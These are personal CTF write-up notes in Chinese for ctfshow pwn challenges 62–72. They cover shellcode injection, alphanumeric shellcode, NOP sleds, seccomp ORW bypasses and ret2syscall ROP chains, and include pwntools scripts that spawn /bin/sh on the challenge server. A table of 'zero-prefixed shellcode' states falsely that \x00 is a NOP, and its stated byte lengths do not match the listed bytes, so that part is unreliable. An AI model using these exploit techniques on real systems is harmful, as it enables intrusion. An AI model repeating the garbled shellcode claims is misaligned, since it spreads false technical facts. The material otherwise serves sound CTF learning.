  _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[0] = 0;
  buf[1] = 0;
  v3 = stdout;
  setvbuf(stdout, 0, 1, 0);
  logo(v3, 0);
  puts("Welcome to CTFshow!");
  printf("What's this : [%p] ?\n", buf);
  puts("Maybe it's useful ! But how to use it?");
  read(0, buf, 0x38u);
  return 0;
}
```
能够发现只读取了0x38，然后覆盖需要0x18，再加上放到buf上执行的0x8位地址码，所以需要其实只有0x18位可以写shellcode，即24位shellcode
所以直接把shellcode换成24位就行了
```python
shell_code = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```

## 63
同上

## 64
老规矩，先检查一下
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/64/pwn
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
开了NX，就是说不能直接在栈上直接执行
看一下反编译
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [esp+8h] [ebp-10h]

  buf = mmap(0, 0x400u, 7, 34, 0, 0);
  alarm(0xAu);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  puts("Some different!");
  if ( read(0, buf, 0x400u) < 0 )
  {
    puts("Illegal entry!");
    exit(1);
  }
  ((void (*)(void))buf)();
  return 0;
}
```
`buf = mmap(0, 0x400u, 7, 34, 0, 0)`：这行代码使用mmap函数分配一块内存区域，将其起始地址保存在变量buf中。mmap函数通常用于在内存中分配一块连续的地址空间，并指定相应的权限和属性。这里buf用mmap映射了地址，prot 为 7 可读可写可执行
?
这个不是直接执行了吗

## 65
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/65/pwn
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
```c
int main() {
    char buf[0x400];
    int n;
    int i;

    write(1, "Input you Shellcode\n", 0x14);

    n = read(0, buf, 0x400);
    if (n <= 0)
        return 0;

    for (i = 0; i < n; i++) {
        unsigned char c = buf[i];

        if ((c > 0x60 && c <= 0x7a) ||      // a-z
            (c > 0x40 && c <= 0x5a) ||      // A-Z
            (c > 0x2f && c <= 0x5a)) {      // 0-Z
            continue;
        } else {
            printf("Good,but not right");
            return 0;
        }
    }

    ((void (*)())buf)();   // 直接执行输入的 shellcode
    return 0;
}

```
??？RCE？是你吗
这个要求是不能有可显示的字符，那就用命令直接修改
先输出字符到一个文件里面，因为是二进制的，所以最好输出到文件，以免复制漏掉了什么东西
```python
b = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

with open('sc', 'bw') as f:

    f.write(b)
```
然后使用命令将这个文件编辑一下重新输出就行了
```
python ALPHA3.py x64 ascii mixedcase rax --input="sc"
```
之后把输出转换成二进制作为payload就行了
```python
from pwn import *

  

io = remote("pwn.challenge.ctf.show", 28146)

io.sendafter(b"Input you Shellcode\n", b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t")

sleep(1)

io.sendline(b"cat /ctfshow_flag")

io.interactive()
```
## 66
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  init(argc, argv, envp);
  logo();
  buf = mmap(0, 0x1000u, 7, 34, 0, 0);
  puts("Your shellcode is :");
  read(0, buf, 0x200u);
  if ( !(unsigned int)check(buf) )
  {
    printf(" ERROR !");
    exit(0);
  }
  ((void (__fastcall *)(void *))buf)(buf);
  return 0;
}


__int64 __fastcall check(_BYTE *a1)
{
  _BYTE *i; // [rsp+18h] [rbp-10h]

  while ( *a1 )
  {
    for ( i = &unk_400F20; *i && *i != *a1; ++i )
      ;
    if ( !*i )
      return 0;
    ++a1;
  }
  return 1;
}
```
看到有一个unk_400F20，直接定位到这里看一下这个是什么东西
```
.rodata:0000000000400F20	00000028	C	ZZJ loves shell_code,and here is a gift:
.rodata:0000000000400F4A	0000000C	C	 enjoy it!\n
.rodata:0000000000400F56	00000014	C	Your shellcode is :
.rodata:0000000000400F6A	00000009	C	 ERROR !
```
就是说我的shellcode只能由这个里面的字符组成
不是哥们好逆天啊
但是问题来了，注意一下这里的循环条件
是`while(*a1)`
这个是遍历字符串，会到/00停止
但是我们执行代码的时候并不会到/00就停止，所以就是要找一个以\x00开头的shellcode就行了
### 一、32 位 Linux (i386) 零开头 Shellcode

#### 1. 极简版 execve /bin/sh (21 字节)

**首字节：\x00** | 无坏字符 | 最常用

asm

```
\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

- 长度：21
- 功能：执行`/bin/sh`
- 原理：开头`\x00`是 NOP 指令，不改变寄存器状态，完美兼容栈执行

#### 2. 免寄存器污染版 (23 字节)

**首字节：\x00** | 适合寄存器敏感场景

asm

```
\x00\x31\xdb\x8d\x43\x08\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

#### 3. 最小体积版 (19 字节)

**首字节：\x00** | 空间极度受限专用

asm

```
\x00\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\xcd\x80
```

---

### 二、64 位 Linux (amd64) 零开头 Shellcode

64 位环境**禁止空字节**的场景更多，零开头 shellcode 必须优化指令序列

#### 1. 标准版 execve /bin/sh (27 字节)

**首字节：\x00** | 64 位 CTF 首选

asm

```
\x00\x48\x31\xff\x57\x54\x5f\xb0\x3b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5e\x0f\x05
```

- 长度：27
- 无坏字符、纯系统调用、无依赖

#### 2. 极简短版 (24 字节)

**首字节：\x00** | 栈空间不足时用

asm

```
\x00\x6a\x29\x58\x99\x52\x6a\x3b\x58\x48\x8d\x3d\x10\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68
```

#### 3. 无 push 版 (兼容内存不可写)

**首字节：\x00** | 特殊防护环境

asm

```
\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x2f\x73\x68
```
不过这里我们一般用\x00\xc6来作为首部
这道题里用其他的payload可能会出现副作用
## 67
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/67/pwn
Arch:     i386
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
```c
// bad sp value at call has been detected, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int position; // eax
  void (*v5)(void); // [esp+0h] [ebp-1010h] BYREF
  unsigned int seed[1027]; // [esp+4h] [ebp-100Ch] BYREF

  seed[1025] = (unsigned int)&argc;
  seed[1024] = __readgsdword(0x14u);
  setbuf(stdout, 0);
  logo();
  srand((unsigned int)seed);
  Loading();
  acquire_satellites();
  position = query_position();
  printf("We need to load the ctfshow_flag.\nThe current location: %p\n", position);
  printf("What will you do?\n> ");
  fgets((char *)seed, 4096, stdin);
  printf("Where do you start?\n> ");
  __isoc99_scanf("%p", &v5);
  v5();
  return 0;
}
int Loading()
{
  int i; // [esp+Ch] [ebp-Ch]

  printf("Please wait while loading...");
  for ( i = 0; i <= 9; ++i )
  {
    usleep(0x493E0u);
    putchar(46);
  }
  return puts("Done");
}
```
这里面有一个直接执行v5，可以直接把shellcode放到v5里面执行
`fgets((char *)seed, 4096, stdin);`
这行代码是读取，存在溢出，但是我们根本不知道v5在哪里
query_position这个函数泄露了地址，可以通过偏移值算出来v5地址然后执行
直接开始动态调试
```
var_1010= dword ptr -1010h
seed= dword ptr -100Ch
var_C= dword ptr -0Ch
argc= dword ptr  8
argv= dword ptr  0Ch
envp= dword ptr  10h
```
这个是确定所有的参数定位的位置
然后再gdb里面运行，直到找到如下图
![[Pasted image 20260404005934.png]]
可以发现这里面显示出来了`[ebp - 0xc]`的地址
那么可以直接减去100c来算出来seed的地址
```
seed = [ebp-0x100c]
     = 0xffffd178 - 0x100c
     = 0xffffc16c
```
接下来就是看v1的地址
```
  char v1; // [esp+3h] [ebp-15h] BYREF
  int v2; // [esp+4h] [ebp-14h]
  char *v3; // [esp+8h] [ebp-10h]
  unsigned int v4; // [esp+Ch] [ebp-Ch]
```
然后在gdb里面看到
![[Pasted image 20260404011635.png]]
那么可以直接根据esp+3算出来
```
v1 = ESP + 0x3
   = 0xffffc140 + 0x3
   = 0xffffc143
```
那么接下来就是计算一下他们之间的偏移值
应该就是0x29
```
高地址
│
│  [main_ebp+4]         main 返回地址
│  [main_ebp]           main 保存的旧 ebp
│  ...
│  [main_ebp-0x100c]    seed
│  ...
│  [main_ebp-0x101c]    返回到 main 的地址
│
│  [query_ebp]          保存的 main_ebp
│  [query_ebp-0x4]      保存的 ebx
│  [query_ebp-0xc]      canary
│  [query_ebp-0x10]     返回值缓存 position
│  [query_ebp-0x14]     v2 = rand()%1337 - 668
│  [query_ebp-0x15]     v1
│
低地址

```
不要问我为什么v2在v1上面，问就是他自己这么规定的
题解里的“空雪橇”就是 NOP sled，也叫“NOP 滑梯”。

它的核心作用很简单：  
你没法百分百精确跳到 shellcode 开头，那就先铺一大片 NOP 指令，只要程序跳进这片区域里的任意位置，CPU 就会一路“滑”到后面的 shellcode 去执行。

**为什么这题要用它**

这题 query_position() 返回的不是固定地址，而是：

`position = &v1 + v2 v2 = rand()%1337 - 668`

也就是说，程序给你的“当前位置”会在一个范围里漂移，误差大约是 [-668, +668]。  
所以你没法把第二次输入的函数指针精确指到 shellcode 起点，否则很容易偏一点就崩了。

这时候就把 seed 里塞成这样：

`[NOP NOP NOP NOP ... NOP][shellcode]`

比如前面放 1336 个 NOP，后面接真正的 shellcode。  
这样即使跳转地址没有正中 shellcode，只要落在前面的 NOP 区里，也会继续往后执行，最后滑到 shellcode。
所以思路就很明确了，在seed里面加上1336位的nop然后在跟上shellcode就行
之后选择从哪里执行就是需要找到v1的真实地址
先加上偏移值0x29
然后是668，就是0x29c
所以现在地址的区间就是
```
&v1 + v2
v2 ∈ [-0x29c, 0x29c]
&seed = &v1 + 0x29
```
所以
```
addr + 0x29c + 0x29
= (&v1 + v2) + 0x29c + 0x29
= &seed + (v2 + 0x29c)
```
所以`addr + 0x29c + 0x29`就是`[ &seed , &seed + 1336 ]`
所以只需要这个地址执行就行了
```python
from pwn import *

  

context(os='linux', arch='i386', log_level='debug')

  

io = remote('pwn.challenge.ctf.show', 28253)

  

io.recvuntil(b'The current location: ')

addr = int(io.recvline(), 16)

  

payload = b'\x90' * 1336 + b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'

io.sendlineafter(b'> ', payload)

io.sendlineafter(b'> ', hex(addr + 0x29c + 0x29).encode())

io.sendline(b'cat /ctfshow_flag')

  

io.interactive()
```
## 68
就是64位的上面一道题目
但是偏移值需要重新计算
```
File:     /mnt/hgfs/share/pwn/栈溢出/68/pwn
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
来吗，不就是重新动态调试吗
找到`[rbp - 0x1010]`就是seed的位置
seed是`0x7fffffffcff0`
然后再找v1的位置
在`query_position`函数里面找
v1是`[rsp+Bh]`
直接看rsp的值，计算偏移量就行
`0x7fffffffcfbb`是v1的值
v1和seed之间的偏移是0x35
直接抄上面一个的程序就行
顺便把输入改一下就行
## 69
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  mmap((void *)0x123000, 0x1000u, 6, 34, -1, 0);
  sub_400949();
  sub_400906();
  sub_400A16();
  return 0;
}
__int64 sub_400949()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(0);
  seccomp_rule_add(v1, 2147418112, 0, 0);
  seccomp_rule_add(v1, 2147418112, 1, 0);
  seccomp_rule_add(v1, 2147418112, 2, 0);
  seccomp_rule_add(v1, 2147418112, 60, 0);
  return seccomp_load(v1);
}
void sub_400906()
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
}
int sub_400A16()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Now you can use ORW to do");
  read(0, buf, 0x38u);
  return puts("No you don't understand I say!");
}
```
seccomp_init(0)：创建一个 seccomp 过滤器，默认动作为 0
这里的 0 一般就是 SCMP_ACT_KILL，也就是“默认不允许，直接杀进程”
2147418112 = 0x7fff0000 = SCMP_ACT_ALLOW
所以后面几条 seccomp_rule_add 的意思就是：
- 允许 syscall 0 -> read
- 允许 syscall 1 -> write
- 允许 syscall 2 -> open
- 允许 syscall 60 -> exit
seccomp-tools dump ./pwn
这行指令可以查看允许使用什么函数
```
└─$ seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```
这道题目应该的应用过程是open打开文件，read打开文件最后write输出
先给出固定payload
```
shell_code = shellcraft.open("/ctfshow_flag")
shell_code += shellcraft.read(3,mmap_addr,0x100) 
shell_code += shellcraft.write(1,mmap_addr,0x100)  
shell_code = asm(shell_code)
```
操作符,3 是代表打开的 ctfshow_flag 文件,操作系统会默认将0、1、2分别给标准输入、标准输出和标准错误，此时要打开一个文件时，系统就会将files_struct数组中下标最小的3开始分配.
[[文件标识符fd和FILE结构体]]
`read(0, buf, 0x38uLL);`
这一行给出了劫持的代码，可以通过这个代码劫持
最开始定义了一个堆，可以直接跳转到这个堆里面进行执行任务
第一段负责：
1. `read(0, 0x123000, 0x100)`
2. `jmp 0x123000`
第二段负责：
3. `open("/ctfshow_flag", 0)`
4. `read(3, 0x123000, 0x100)`
5. `write(1, 0x123000, 0x100)`
重新关注到payload里面
整个流程开始，先读取payload
然后覆盖掉0x28的位置，注意一下这个时候程序并没有执行
然后是    
```
jmp_rsp,
asm("sub rsp, 0x30; jmp rsp")
```
然后直接jmp rsp跳到当前rsp指向的位置
这里rsp执行的位置就是下面指令sub rsp, 0x30; jmp rsp的位置
函数栈帧里面保存的最后两条分别是rbp和rip
rbp
- 是基址寄存器，通常用来标记当前函数栈帧的位置
- 程序常用它定位局部变量和保存的返回地址
- 比如这题里有 lea rax, [rbp-0x20]，意思就是缓冲区在 rbp 往下 0x20 的位置
rip
- 是指令指针寄存器
- 它表示“CPU 下一条要执行的指令地址”
- 程序之所以能一条一条往下跑，本质就是 rip 在变
正常情况下只需要把rsp设定为rbp的值，然后rip指定下一条指令应该怎么执行就可以了
在这道题里面leave没有被覆盖，leave等价于
```
mov rsp, rbp
pop rbp
```
把rsp定义为rbp，然后把rbp弹出到下一个指定值，就是恢复了函数栈帧
但是这里原本rbp指向的是栈底，所以现在的rsp执行的是就是`sub_400A16`的栈底
然后rip被被覆盖为`0x400A01`，就是jmp rsp
就是跳转到下一条指令执行的位置
注意了，因为这道题目是nx，所以ret必须跳转到地址，不能是机器码，所以这里不能用asm直接捏一条指令出来
下一条指令跳转是栈迁移，就是`asm("sub rsp, 0x30; jmp rsp")`
往rsp里面塞一地址，然后直接跳转到这个地址
这里是减，直接减到0x30上面的位置
就是直接跳转到read，然后跳转执行的地方
## 70
打开看一下，不能反编译
发现有set_secommp，先反编译看一下
反编译不出来，看一下沙盒能用什么
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```
除了execve都能用，提示我们用orw
同时检测是不是每一个字符都能打印
```c
int main(int argc, char **argv)
{
    char buf[0x68];          // 104 bytes
    ssize_t n;

    init();
    set_secommp();           // 开 seccomp

    bzero(buf, 0x68);
    logo();
    puts("Welcome,tell me your name:");

    n = read(0, buf, 0x64);  // 最多读 100 字节
    buf[n - 1] = '\0';       // 把最后一个换行改成 0

    if (is_printable(buf)) {
        ((void (*)())buf)(); // 直接把输入当代码执行
    } else {
        puts("It must be a printable name!");
    }

    return 0;
}
int is_printable(char *s)
{
    for (int i = 0; i < strlen(s); i++) {
        if (s[i] <= 0x1f || s[i] == 0x7f)
            return 0;
    }
    return 1;
}

```
## 71
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/71/pwn
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
Debuginfo:  Yes
```
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h] BYREF

  IO_setvbuf(stdout, 0, 2, 0);
  IO_setvbuf(stdin, 0, 1, 0);
  IO_puts("===============CTFshow--PWN===============");
  IO_puts("Try to use ret2syscall!");
  IO_gets(&v4);
  return 0;
}
// Alternative name is 'gets'
int __cdecl IO_gets(_BYTE *a1)
{
  _DWORD *v1; // ebx
  _BYTE *v2; // esi
  _DWORD *v3; // edx
  unsigned int v5; // edx
  bool v7; // zf
  unsigned __int8 *v8; // eax
  int v9; // eax
  char v10; // di
  int v11; // edi
  int v12; // eax
  _DWORD *v13; // edx

  v1 = stdin;
  v2 = a1;
  v3 = stdin;
  if ( (*(_DWORD *)stdin & 0x8000) == 0 )
  {
    _EDI = *((_DWORD *)stdin + 18);
    v5 = __readgsdword(8u);
    if ( v5 == *(_DWORD *)(_EDI + 8) )
    {
      v3 = stdin;
    }
    else
    {
      _ECX = 1;
      v7 = __readgsdword(0xCu) == 0;
      if ( !v7 )
        __asm { lock }
      __asm { cmpxchg [edi], ecx }
      if ( !v7 )
        return L_lock_42();
      _EDI = v1[18];
      *(_DWORD *)(_EDI + 8) = v5;
      v3 = stdin;
    }
    ++*(_DWORD *)(_EDI + 4);
  }
  v8 = (unsigned __int8 *)v3[1];
  if ( (unsigned int)v8 >= v3[2] )
  {
    v9 = _uflow(v3);
    if ( v9 == -1 )
      goto LABEL_23;
  }
  else
  {
    v3[1] = v8 + 1;
    v9 = *v8;
  }
  if ( v9 == 10 )
  {
    v12 = 0;
    goto LABEL_13;
  }
  v10 = *(_DWORD *)stdin;
  *(_DWORD *)stdin &= ~0x20u;
  v11 = v10 & 0x20;
  *a1 = v9;
  v12 = IO_getline(stdin, a1 + 1, 0x7FFFFFFF, 10, 0) + 1;
  if ( (*(_DWORD *)stdin & 0x20) == 0 )
  {
    *(_DWORD *)stdin |= v11;
LABEL_13:
    a1[v12] = 0;
    goto LABEL_14;
  }
LABEL_23:
  v2 = 0;
LABEL_14:
  if ( (*v1 & 0x8000) != 0 )
    return (int)v2;
  v13 = (_DWORD *)v1[18];
  v7 = v13[1]-- == 1;
  if ( !v7 )
    return (int)v2;
  v13[2] = 0;
  if ( __readgsdword(0xCu) )
    __asm { lock }
  v7 = (*v13)-- == 1;
  if ( v7 )
    return (int)v2;
  else
    return L_unlock_144();
}
```
这个就是get函数，没有限制输入长度，所以可以直接栈溢出
nx开了，所以需要找现有的程序
所以需要直接在源程序里面找能用的代码直接输进去执行
这里offset是112，因为栈对齐
懒得算，直接cyclic算就行了
前面的pie已经算出来了他的基址是多少，所以把偏移值找出来，加上基址就行了
`execve`的系统调用号是0xb，所以需要在rax里写0xb
之后需要三个参数，所以ebx,ecx,edx三个参数依次是`"/bin/sh"`,`""`,`""`
最后加一个int 0x80作为执行现在调用栈的指令
因为是i386系统，所以需要的payload形式如下
```
eax = 0xb
ebx = "/bin/sh" 的地址
ecx = 0
edx = 0
int 0x80
```
最终payload长这样
```python
payload = b"A" * offset
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh)
payload += p32(int_80)
```

使用ROP找一下指令
```
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809d7b2 : pop ds ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d5 : pop ebp ; pop esi ; pop edi ; ret
0x0804838e : pop ebp ; ret
0x080a9a45 : pop ebp ; ret 0x10
0x08096a29 : pop ebp ; ret 0x14
0x08070d76 : pop ebp ; ret 0xc
0x0804854a : pop ebp ; ret 4
0x08049c00 : pop ebp ; ret 8
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0804838d : pop edi ; pop ebp ; ret
0x080a9a44 : pop edi ; pop ebp ; ret 0x10
0x08096a28 : pop edi ; pop ebp ; ret 0x14
0x08070d75 : pop edi ; pop ebp ; ret 0xc
0x08048549 : pop edi ; pop ebp ; ret 4
0x08049bff : pop edi ; pop ebp ; ret 8
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0805c508 : pop edi ; pop esi ; ret
0x0804846f : pop edi ; ret
0x08049a1b : pop edi ; ret 4
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0806eb6a : pop edx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080671ea : pop es ; pop edi ; ret
0x0806742a : pop es ; ret
0x08092259 : pop esi ; pop ebp ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x0804838c : pop esi ; pop edi ; pop ebp ; ret
0x080a9a43 : pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a27 : pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d74 : pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048548 : pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfe : pop esi ; pop edi ; pop ebp ; ret 8
0x0804846e : pop esi ; pop edi ; ret
0x08049a1a : pop esi ; pop edi ; ret 4
0x08049a95 : pop esi ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080bb146 : pop esp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
0x080639f9 : pop ss ; ret 0x2c73
0x080643ba : pop ss ; ret 0x3273
0x080639e4 : pop ss ; ret 0x3e73
0x080643a0 : pop ss ; ret 0x4c73
0x080639cf : pop ss ; ret 0x5073
0x080639ba : pop ss ; ret 0x6273
0x08064386 : pop ss ; ret 0x6673
0x08061f05 : pop ss ; ret 0x830f
0x080481b2 : ret
```
0x080bb196 : pop eax ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
上面这两天能直接找到这两个参数
然后就是找int
0x08049421 : int 0x80
找到这几个之后直接带入程序就能执行
## 72
先checksec，然后栈偏移
```
pwndbg> checksec
File:     /mnt/hgfs/share/pwn/栈溢出/72/pwn
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
cyclic算出来是44
nx开了，那就不能在栈上面执行函数
直接看一下反编译后的代码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+10h] [ebp-20h] BYREF

  IO_setvbuf(stdout, 0, 2, 0);
  IO_setvbuf(stdin, 0, 1, 0);
  IO_puts("CTFshow-PWN");
  IO_puts("where is my system?");
  IO_gets(&v4);
  IO_puts("Emmm");
  return 0;
}
```
和上面一道题目差不多
```
Gadgets information
============================================================
0x0809df12 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809d8e2 : pop ds ; ret
0x0809df0a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb2c6 : pop eax ; ret
0x0807229a : pop eax ; ret 0x80e
0x0805b7cd : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e305 : pop ebp ; pop esi ; pop edi ; ret
0x0804838e : pop ebp ; ret
0x080a9b75 : pop ebp ; ret 0x10
0x08096b59 : pop ebp ; ret 0x14
0x08070e96 : pop ebp ; ret 0xc
0x0804854a : pop ebp ; ret 4
0x08049c00 : pop ebp ; ret 8
0x0809e304 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be36f : pop ebx ; pop edi ; ret
0x0806ec89 : pop ebx ; pop edx ; ret
0x08092378 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9b72 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096b56 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070e93 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7e5c : pop ebx ; ret 0x6f9
0x08099db7 : pop ebx ; ret 8
0x0806ecb1 : pop ecx ; pop ebx ; ret
0x0804838d : pop edi ; pop ebp ; ret
0x080a9b74 : pop edi ; pop ebp ; ret 0x10
0x08096b58 : pop edi ; pop ebp ; ret 0x14
0x08070e95 : pop edi ; pop ebp ; ret 0xc
0x08048549 : pop edi ; pop ebp ; ret 4
0x08049bff : pop edi ; pop ebp ; ret 8
0x0806344b : pop edi ; pop esi ; pop ebx ; ret
0x0805c5e8 : pop edi ; pop esi ; ret
0x0804846f : pop edi ; ret
0x08049a1b : pop edi ; ret 4
0x0806ecb0 : pop edx ; pop ecx ; pop ebx ; ret
0x0806ec8a : pop edx ; ret
0x0809df09 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080672ca : pop es ; pop edi ; ret
0x0806750a : pop es ; ret
0x08092379 : pop esi ; pop ebp ; ret
0x0806ec88 : pop esi ; pop ebx ; pop edx ; ret
0x0805c900 : pop esi ; pop ebx ; ret
0x0804838c : pop esi ; pop edi ; pop ebp ; ret
0x080a9b73 : pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096b57 : pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070e94 : pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048548 : pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfe : pop esi ; pop edi ; pop ebp ; ret 8
0x0804846e : pop esi ; pop edi ; ret
0x08049a1a : pop esi ; pop edi ; ret 4
0x08049a95 : pop esi ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080bb276 : pop esp ; ret
0x0807b80d : pop ss ; pop ebx ; ret
0x08063ad9 : pop ss ; ret 0x2c73
0x0806449a : pop ss ; ret 0x3273
0x08063ac4 : pop ss ; ret 0x3e73
0x08064480 : pop ss ; ret 0x4c73
0x08063aaf : pop ss ; ret 0x5073
0x08063a9a : pop ss ; ret 0x6273
0x08064466 : pop ss ; ret 0x6673
